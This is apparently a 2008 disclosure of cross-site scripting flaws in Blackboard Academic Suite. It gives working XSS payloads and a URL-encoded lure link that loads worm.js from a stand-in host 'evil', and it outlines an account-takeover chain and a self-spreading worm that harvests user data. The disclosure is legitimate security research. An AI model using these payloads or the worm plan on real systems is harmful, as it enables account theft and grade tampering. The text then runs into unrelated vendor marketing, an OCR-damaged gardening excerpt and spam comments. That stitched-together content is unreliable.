Blackboard Academic Suites Multiple Cross Site Scripting Vulnerabilities
Background:
Blackboard Academic Suite Blackboard is an enterprise software solution for providing interactive learning and management capabilities for educational institutions.
Many institutions currently are using Blackboard such as: Princeton, Yale, Duke University of Pennsylvania, and University of Texas at Austin ?
Platforms Affected:
All versions (7.x and lower)
Description: Combining XSS and some conditions already exists in Blackboard system.
Attacker can login and do everything (change grades, edit online test?s content?) with instructors? identity.
Vulnerable paths:
1/
http://site.edu/webapps/blackboard/execute/viewCatalog?type=Course&searc
hText=?><script>alert(?xss?)</script>
2/Add announcement page: (instructor access only)
http://site.edu/bin/common/announcement.pl?action=ADD&course\_id=\_137839\_
1&render\_type=EDITABLE&context=course
<input type="text" name="data\_\_announcements\_\_\_pk1\_pk2\_\_subject" value=?<script>alert(?worm activated!?)</script>? />
Author: Duong Thanh - Knight4vn
(knightvn (at) gmail.com or knight4vn (at) yahoo.com )
Vulnerabilities discovered: 12/2007
Vendor and Universities Contacted: 02/2008
Public disclosure: 03/2008
PART I - COMPROMISING USER?S ACCOUNT
Explanation:
When user already has session and he/she clicks on that link (from email), the exploit code will be automatically executed. User?s email address is changed without his/her notice. At the same time, his/her current email address, first and last name, and current encrypted password (in User Information page) is logged by a remote server side script.
The attacker reads all these information in a log file.
After that, he gets a new user password sent to his email address by using Lost Password form.
With victim?s username and password, the attacker has full permission on that account and does whatever he wants.
Upon finishing his works, he changes back user?s initial email address and encrypted password.
Analysis:
Although we can change victim?s password by using exploit code but we should not use it. The victim can not login to the system and he/she immediately realize there is something fishy.
Edit Personal Info page:
http://site.edu/webapps/blackboard/execute/editUser?context=self\_modify
Blackboard stores encrypted user password in Edit Personal Info page:
<INPUT TYPE="hidden" NAME="password" VALUE="CE0BFD15059B68D67688884D7A3D3E8C">
Hence, we have no problem with grabbing current user?s encrypted password.
On this page:
http://site.edu/bin/common/user.pl?action=MODIFY&context=PASSWORD
Blackboard calls a function in ?/javascript/md5.js? to encrypt password on client side before submitting this form to ?/webapps/blackboard/execute/editUser?. So it?s possible to submit directly encrypted password to the server side script. Therefore, we take advantage of this to bring victim?s encrypted password back to its initial state.
As a result, victim?s account was compromised completely without his/her awareness.
Proof-of-concept:
Steal.js
PART II - MAKING A WEB-BASED WORM
Just imagine what would happen if someone took advantage of these holes to create a javascript-based worm? Think about this scenario for a second:
A black-hat guy wrote a worm and he send it to a person (for ex: an instructor).
The instructor immediately gets infected. The worm uses his identity to spread by sending itself to all student current enrolling his courses. Students get infected; the worm once again uses their identity to send itself to all their classmates and their other instructors? Combination of multiple XSS vulnerabilities make the worm spread very fast.
During its propagation, the worm could log all private users info (emails, names, grades?) then report back to the attacker (for spamming purposes), or it could simply do whatever the attacker wants with user account.
ANALYSIS:
Blackboard does not filter on title of Announcement
<input type="text" name="data\_\_announcements\_\_\_pk1\_pk2\_\_subject" value=?<script>alert(?worm activated!?)</script>? />
So we can take advantage of this persistent XSS to inject arbitrary script on the web page.
The announcement will be posted on the front page. So once students log in
The malicious script will have to be run at least one time.
Students spread this worm by sending the infected link to their classmates
and his other instructors via Send mail form of Blackboard.
Here is what a student will be forced to send in the email.
Encoded Version:
Hi,
I don?t understand today online assignment. Would you mind helping me out?
http://site.edu/webapps/blackboard/execute/viewCatalog?type=Course&searc
hText=%94%3E%3C%73%63%72%69%70%74%20%73%72%63%20%3D%20%91%68%74%74%70%3A
%2F%2F%65%76%69%6C%2F%77%6F%72%6D%2E%6A%73%92%3E%3C%2F%73%63%72%69%70%74
%3E
Proof-Of-Concept: worm.js
Worm Features:
Log all user info and send them to the attacker.
Propanagate by Send mail form and create announcements with hidden malicious script.
CONCLUSION:
It is possible for hackers to silently steal instructor?s password and change his grade. In worst case, he could use XSS worm to take the entire system down (MySpace?s case). The consequence is foreseeable.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

    Elements of Garden Design It is probably correct to say that many successful garden lay-outs started to take shape on a drawing board. At the beginning-although it will be known what sort of garden is envisaged and some of the features to be included-it is not necessary to formulate any definite ideas on design but better to concentrate first on measuring and recording all the existing features so that an accurate bird’s-eye view of the garden can be drawn to scale. There is no other way of seeing the area as a whole and the position of the house satisfactorily. It is from this stage that ideas for the design of the garden and planting plans can be formulated. THE EARLY PLANNING STAGE It is unusual for a plot of land to be exactly rectangular and the sides are often unequal in length. The essential aids at this early stage are a measuring tape, at least 6oft(i8m) in length; a metal spike to secure the end, and a large writing pad. Even without the aid of a surveyor’s more elaborate apparatus, a fairly accurate survey can be made to determine the direction of the boundaries and the position of the house relative to these, by taking the measurement from a corner of the house or building in line with the wall to the boundary (Fig.i). If the same process is repeated on the same side from another corner it will show if the boundary is at an angle or parallel to the building.A further check can be made by fixing the tape in one of the far corners of the site and proceeding along the bottom boundary until the wall of the building-which would be seen al right angles-disappears from view. If this measurement is compared with the others made earlier the points on the boundary should touch at the three places. If it is necessary to mark a sight line across a piece of land from one poin to another, it is useful to have available 10 or more 6ft(2m) bamboo canes (see Fig.2). The canes are then spaced, perhaps 8 or ioft(2.5 or 3m) or more apart, over a given distance, and when five or six canes are in position the line is made exactly straight by adjusting the intermediate canes between the two end ones. When a sighting is made from the furthest end, only the nearest cane will then be visible. The position of a tree or other permanen features can be recorded by measuring from the object in question to two points which are separated by a known distance; this could be two corners of the house. The measurements are then transcribed to paper with the use of a compass and the place marked where the arcs cross. Having noted as many details as possible that are likely to be useful, a plan of the area can be drawn to scale. It can usually be assumed that if the design appears to be right on paper it will probably be right on the site. The need to see the garden first in plan form applies particularly if the beds an< contours follow a curved outline.

    Hey <http://www.us-cert.gov>. I actually thought of if any individual here plays Grepolis or perhaps currently have used the application previously?

    I’m questioning for the reason that it probably would end up being sweet to actually play someday with the help of any person.

    Hi there just wanted to give you a quick heads up.

    The words in your content seem to be running off the

    screen in Chrome. I’m not sure if this is a format issue or something to do with web browser

    compatibility but I thought I’d post to let you know.

    The design look great though! Hope you get the

    problem fixed soon. Cheers

    аз най-накрая завърши 90-дневна диета и аз съм толкова доволен от резултатите, които съм постигнал. Това е дълъг път за мен и моята резервна тегло, но сега съм по-уверен и като цяло по-щастлив човек.

    With havin so much written content do you ever run into any problems of plagorism or copyright infringement?

    My blog has a lot of exclusive content I’ve either written myself or outsourced but it looks like

    a lot of it is popping it up all over the web without my

    permission. Do you know any methods to help protect against content from being

    ripped off? I’d really appreciate it.
